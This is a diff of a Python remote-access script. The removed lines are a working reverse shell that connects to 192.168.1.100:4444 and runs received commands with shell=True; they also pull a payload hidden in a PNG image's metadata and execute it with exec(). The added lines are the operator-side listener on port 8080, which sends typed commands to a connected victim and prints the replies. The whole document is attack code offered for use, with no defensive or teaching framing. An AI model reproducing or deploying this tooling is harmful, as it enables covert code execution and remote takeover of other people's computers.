@@ -1,63 +1,62 @@
 import socket
-import subprocess
-import sys
+import os
 import ctypes
 
-# Function to check if the script is running with administrative privileges
-def is_admin():
+def check_admin_access():
     try:
-        return ctypes.windll.shell32.IsUserAnAdmin()
-    except:
-        return False
-
-# Function to extract hidden payload from an image
-def extract_payload(image_path):
-    try:
-        with Image.open(image_path) as img:
-            payload = img.info.get("payload")
-            if payload:
-                return payload.encode()
-            else:
-                return None
+        return ctypes.windll.shell32.IsUserAnAdmin() != 0    # Windows admin check (non-zero = admin)
     except Exception as e:
-        print(f"Error extracting payload: {e}")
-        return None
+        return f"Error checking admin status: {e}"           # Handle any exceptions during check
 
-# Reverse shell functionality
-def reverse_shell(server_ip, server_port):
-    try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect((server_ip, server_port))
-        while True:
-            command = s.recv(1024).decode("utf-8")
-            if command.lower() == "exit":
+def connect():
+    print("=" * 50)
+    print("[+] Listening for incoming TCP connections on port 8080")
+    mySocket = socket.socket()
+    mySocket.bind(("192.168.83.128", 8080)) 
+    mySocket.listen(1)
+    connection, address = mySocket.accept()
+    print("=" * 50)
+    print(f"Connection established: {address}")
+    
+    while True:
+        try:
+            command = input("Shell > ")
+            if command == "checkUserLevel":                   # Special command to check Windows privileges
+                is_admin = check_admin_access()
+                print(f"Admin privileges: {'YES' if is_admin else 'NO'}")
+                continue                                      # Continue to next command
+            elif "terminate" in command:
+                connection.send("terminate".encode())
+                connection.close()
                 break
-            if command.startswith("cd"):
-                try:
-                    os.chdir(command[3:].strip())
-                    s.send(b"Changed directory successfully\n")
-                except FileNotFoundError:
-                    s.send(b"Directory not found\n")
-                continue
-            process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-            output, error = process.communicate()
-            s.send(output + error)
-        s.close()
+            else:
+                connection.send(command.encode())
+                response = connection.recv(5000).decode()
+                if not response:  # Empty response could indicate closed connection
+                    print("Connection may have been closed by the client")
+                    break
+                print(response)
+        except BrokenPipeError:
+            print("Connection lost - the client has disconnected")
+            break
+        except ConnectionResetError:
+            print("Connection was reset by the client")
+            break
+        except Exception as e:
+            print(f"An error occurred: {e}")
+            break
+    
+    # Always ensure the socket is closed properly
+    try:
+        connection.close()
+    except:
+        pass
+
+def main():
+    try:
+        connect()
     except Exception as e:
-        print(f"Connection error: {e}")
+        print(f"Failed to establish connection: {e}")
 
 if __name__ == "__main__":
-    if is_admin():
-        print("Running with administrative privileges.")
-    else:
-        print("Warning: Not running with administrative privileges.")
-
-    # Define image path with hidden payload
-    image_path = "hidden_payload.png"  # Image must contain an embedded payload
-    payload = extract_payload(image_path)
-    
-    if payload:
-        exec(payload.decode())
-    
-    # Start reverse shell (replace with target listener details)
-    reverse_shell("192.168.1.100", 4444)
+    main()
